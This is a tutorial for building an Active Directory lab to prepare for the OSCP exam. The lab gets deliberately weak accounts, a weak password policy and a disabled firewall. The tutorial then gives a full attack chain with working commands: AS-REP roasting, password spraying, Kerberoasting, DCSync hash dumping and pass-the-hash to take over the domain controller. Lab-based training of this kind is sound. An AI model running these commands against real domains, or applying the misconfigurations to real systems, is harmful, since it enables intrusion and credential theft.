# Lab: Build Your Own Active Directory Lab

## Why You Need This

The AD set is worth 40 points on the OSCP exam — 40% of your total score. You can't practice AD attacks against your current Linux VMs. You need Windows machines in a domain. This guide walks you through building a functional AD lab from scratch using free Microsoft evaluation software.

---

## What You're Building

```
┌──────────────────────────────────────────────────────┐
│                    YOUR AD LAB                        │
│                                                      │
│  DC01 (Domain Controller)          WS01 (Workstation)│
│  Windows Server 2022               Windows 11        │
│  192.168.244.140                   192.168.244.141   │
│  corp.local                        (domain-joined)   │
│                                                      │
│  Kali (attacker)                                     │
│  192.168.244.129                                     │
└──────────────────────────────────────────────────────┘
```

You'll have:
- A Domain Controller running Active Directory
- A workstation joined to the domain
- Domain users, groups, and service accounts
- Intentional misconfigurations to practice attacking

---

## Step 1: Download the Software (All Free)

### Windows Server 2022 Evaluation

```
1. Go to: https://www.microsoft.com/en-us/evalcenter/evaluate-windows-server-2022
2. Select "ISO" format
3. Fill in the registration form (any info works)
4. Download the ISO (~5GB)
5. This gives you 180 days of full functionality — more than enough
```

### Windows 11 (you already have this VM)

Use your existing Windows 11 VM, or download another evaluation copy.

---

## Step 2: Create the Domain Controller VM

### VMware settings

```
Name:      DC01
CPU:       2 cores
RAM:       4 GB (minimum — 6GB recommended)
Disk:      60 GB
Network:   NAT (same network as your other VMs — 192.168.244.x)
ISO:       Windows Server 2022 evaluation ISO
```

### Install Windows Server

```
1. Boot from the ISO
2. Select "Windows Server 2022 Standard Evaluation (Desktop Experience)"
   — Desktop Experience gives you a GUI (without it, it's command-line only)
3. Custom install → select the disk → install
4. Set the Administrator password: P@ssw0rd! (or whatever you prefer — remember it)
5. After install, log in as Administrator
```

### Set a static IP

```powershell
# Open PowerShell as Administrator
# Find your network adapter name
Get-NetAdapter

# Set static IP (adjust the adapter name if yours is different)
New-NetIPAddress -InterfaceAlias "Ethernet0" -IPAddress 192.168.244.140 -PrefixLength 24 -DefaultGateway 192.168.244.2
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.244.140,8.8.8.8
```

The DNS should point to itself (192.168.244.140) because this machine will be the DNS server for the domain.

### Rename the computer

```powershell
Rename-Computer -NewName "DC01" -Restart
```

### Verify from Kali

```bash
ping 192.168.244.140
nmap -sV -p 135,139,445,3389 192.168.244.140
```

---

## Step 3: Install Active Directory

### Install the AD DS role

```powershell
# Install Active Directory Domain Services
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to Domain Controller
Install-ADDSForest `
    -DomainName "corp.local" `
    -DomainNetbiosName "CORP" `
    -SafeModeAdministratorPassword (ConvertTo-SecureString "RecoveryP@ss1!" -AsPlainText -Force) `
    -InstallDns:$true `
    -Force:$true
```

The server will restart automatically. After reboot, log in as **CORP\Administrator**.

### Verify AD is running

```powershell
# Check AD services
Get-Service -Name "NTDS","DNS","kdc"

# Check domain
Get-ADDomain
Get-ADForest
```

From Kali:
```bash
nmap -sV -p 53,88,135,139,389,445,636,3389,5985 192.168.244.140
# You should see: DNS(53), Kerberos(88), LDAP(389), SMB(445)
# These confirm it's a Domain Controller
```

---

## Step 4: Create Domain Users and Groups

### Create users with varying privilege levels

```powershell
# Organizational Units (organize users)
New-ADOrganizationalUnit -Name "IT" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "HR" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=corp,DC=local"

# Regular users
New-ADUser -Name "John Smith" -SamAccountName "jsmith" -UserPrincipalName "jsmith@corp.local" `
    -Path "OU=IT,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "Welcome2026!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

New-ADUser -Name "Sarah Johnson" -SamAccountName "sjohnson" -UserPrincipalName "sjohnson@corp.local" `
    -Path "OU=HR,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "Summer2026!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

New-ADUser -Name "Mike Chen" -SamAccountName "mchen" -UserPrincipalName "mchen@corp.local" `
    -Path "OU=IT,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# IT admin user (local admin on workstations)
New-ADUser -Name "IT Admin" -SamAccountName "itadmin" -UserPrincipalName "itadmin@corp.local" `
    -Path "OU=IT,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "ITadm1n@2026" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

# Service accounts (for Kerberoasting practice)
New-ADUser -Name "SQL Service" -SamAccountName "svc_sql" -UserPrincipalName "svc_sql@corp.local" `
    -Path "OU=Service Accounts,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "SQLserv1ce!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true

New-ADUser -Name "Backup Service" -SamAccountName "svc_backup" -UserPrincipalName "svc_backup@corp.local" `
    -Path "OU=Service Accounts,DC=corp,DC=local" -AccountPassword (ConvertTo-SecureString "Backup2026!" -AsPlainText -Force) `
    -Enabled $true -PasswordNeverExpires $true -Description "Temp password: Backup2026!"
```

### Set up groups and memberships

```powershell
# Add itadmin to Domain Admins (the high-value target)
Add-ADGroupMember -Identity "Domain Admins" -Members "itadmin"

# Make svc_sql a local admin on workstations (for lateral movement)
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"
```

### Create intentional misconfigurations

```powershell
# === AS-REP ROASTABLE USER ===
# Disable pre-authentication for mchen (AS-REP Roasting target)
Set-ADAccountControl -Identity "mchen" -DoesNotRequirePreAuth $true

# === KERBEROASTABLE USER ===
# Set an SPN on svc_sql (Kerberoasting target)
Set-ADUser -Identity "svc_sql" -ServicePrincipalNames @{Add="MSSQLSvc/dc01.corp.local:1433"}
Set-ADUser -Identity "svc_backup" -ServicePrincipalNames @{Add="HTTP/dc01.corp.local"}

# === PASSWORD IN DESCRIPTION ===
# (svc_backup already has this from the creation command above)
# This simulates a common real-world finding

# === WEAK PASSWORD POLICY ===
# Set a weak domain password policy (for password spraying practice)
Set-ADDefaultDomainPasswordPolicy -Identity "corp.local" `
    -LockoutThreshold 0 `
    -MinPasswordLength 4 `
    -ComplexityEnabled $false
```

### Create SMB shares with useful content

```powershell
# Create a shared folder with sensitive documents
New-Item -Path "C:\Shares\IT" -ItemType Directory -Force
New-Item -Path "C:\Shares\Public" -ItemType Directory -Force

# Add content
Set-Content -Path "C:\Shares\IT\network_map.txt" -Value "Internal servers:`nDC01 - 192.168.244.140`nWS01 - 192.168.244.141`n`nAdmin credentials stored in KeePass on DC01"
Set-Content -Path "C:\Shares\IT\onboarding.txt" -Value "New employee default password: Welcome2026!`nPlease change on first login.`nVPN: vpn.corp.local`nWiFi password: CorpWifi2026"
Set-Content -Path "C:\Shares\Public\company_policy.txt" -Value "Company IT Policy v3.2"

# Share them
New-SmbShare -Name "IT" -Path "C:\Shares\IT" -FullAccess "CORP\Domain Admins" -ReadAccess "CORP\Domain Users"
New-SmbShare -Name "Public" -Path "C:\Shares\Public" -ReadAccess "Everyone"
```

### Enable WinRM (for evil-winrm access)

```powershell
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
```

### Disable Windows Firewall (lab only — makes testing easier)

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

---

## Step 5: Join Windows 11 to the Domain

### On your Windows 11 VM

**Set DNS to point to the DC:**

```powershell
# PowerShell as Administrator
Set-DnsClientServerAddress -InterfaceAlias "Ethernet0" -ServerAddresses 192.168.244.140
```

**Join the domain:**

```powershell
Add-Computer -DomainName "corp.local" -Credential (Get-Credential)
# Enter: CORP\Administrator and the domain admin password
# Restart when prompted
```

After reboot, you can log in as any domain user: `CORP\jsmith`, `CORP\sjohnson`, etc.

**Make itadmin a local admin on this workstation:**

```powershell
# On DC01 (or using Group Policy)
# This may already work since itadmin is in Domain Admins

# Or manually on WS01:
Add-LocalGroupMember -Group "Administrators" -Member "CORP\itadmin"
```

**Log in as jsmith on WS01 to simulate a real user session:**

Log in as `CORP\jsmith` (password: Welcome2026!) and leave the session open. This puts jsmith's credentials in memory — which Mimikatz can dump if you compromise this machine.

---

## Step 6: Practice the AD Attack Chain

### From Kali — the full attack sequence

**1. Scan and identify the DC:**

```bash
nmap -sV -p 53,88,135,139,389,445,636,3389,5985 192.168.244.140
nmap -sV -p 135,139,445,3389,5985 192.168.244.141
```

**2. Enumerate without credentials:**

```bash
# Null session SMB
crackmapexec smb 192.168.244.140 -u '' -p ''
enum4linux -a 192.168.244.140

# LDAP anonymous
ldapsearch -x -H ldap://192.168.244.140 -b "DC=corp,DC=local"

# Enumerate valid usernames with Kerbrute
kerbrute userenum -d corp.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 192.168.244.140
```

**3. AS-REP Roast (mchen has pre-auth disabled):**

```bash
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 192.168.244.140 -format hashcat
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
# Should crack mchen's password: P@ssw0rd123
```

**4. Password spray:**

```bash
crackmapexec smb 192.168.244.140 -u users.txt -p 'Welcome2026!' --continue-on-success
# Should find sjohnson (or any user with the default password)
```

**5. Enumerate with credentials:**

```bash
crackmapexec smb 192.168.244.140 -u mchen -p 'P@ssw0rd123' --shares
crackmapexec smb 192.168.244.140 -u mchen -p 'P@ssw0rd123' --users
bloodhound-python -u mchen -p 'P@ssw0rd123' -d corp.local -ns 192.168.244.140 -c all
```

**6. Kerberoast (svc_sql and svc_backup have SPNs):**

```bash
impacket-GetUserSPNs corp.local/mchen:'P@ssw0rd123' -dc-ip 192.168.244.140 -request
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
# Should crack svc_sql: SQLserv1ce! (svc_sql is Domain Admin!)
```

**7. Check where svc_sql has admin access:**

```bash
crackmapexec smb 192.168.244.140-141 -u svc_sql -p 'SQLserv1ce!'
# Should show (Pwn3d!) on both machines
```

**8. Lateral movement and credential dumping:**

```bash
# Access the workstation
evil-winrm -i 192.168.244.141 -u svc_sql -p 'SQLserv1ce!'

# Or dump creds remotely
impacket-secretsdump corp.local/svc_sql:'SQLserv1ce!'@192.168.244.141

# DCSync (svc_sql is Domain Admin)
impacket-secretsdump corp.local/svc_sql:'SQLserv1ce!'@192.168.244.140
# This dumps EVERY hash in the domain including Administrator and krbtgt
```

**9. Domain compromise:**

```bash
# Pass the hash as Administrator
impacket-psexec corp.local/administrator@192.168.244.140 -hashes aad3b435:ADMIN_NTLM_HASH

# You're SYSTEM on the Domain Controller — game over
```

---

## Attack Path Summary

```
1. nmap → identify DC (ports 88,389) and workstation
2. AS-REP Roast → crack mchen's password (no creds needed)
3. Password spray → find users with default password
4. Kerberoast with mchen's creds → crack svc_sql password
5. svc_sql is Domain Admin → crackmapexec confirms admin on DC
6. DCSync with svc_sql → dump ALL domain hashes
7. PtH as Administrator → SYSTEM on DC → domain compromised
```

This is exactly the type of chain you'll face on the OSCP AD set.

---

## Resetting the Lab

To practice again from scratch:

```powershell
# On DC01 — reset passwords (or rebuild users)
Set-ADAccountPassword -Identity "mchen" -NewPassword (ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force)
Set-ADAccountPassword -Identity "svc_sql" -NewPassword (ConvertTo-SecureString "SQLserv1ce!" -AsPlainText -Force)

# Clear Kerberos tickets on WS01
klist purge
```

Or take VM snapshots after setup and revert to them.
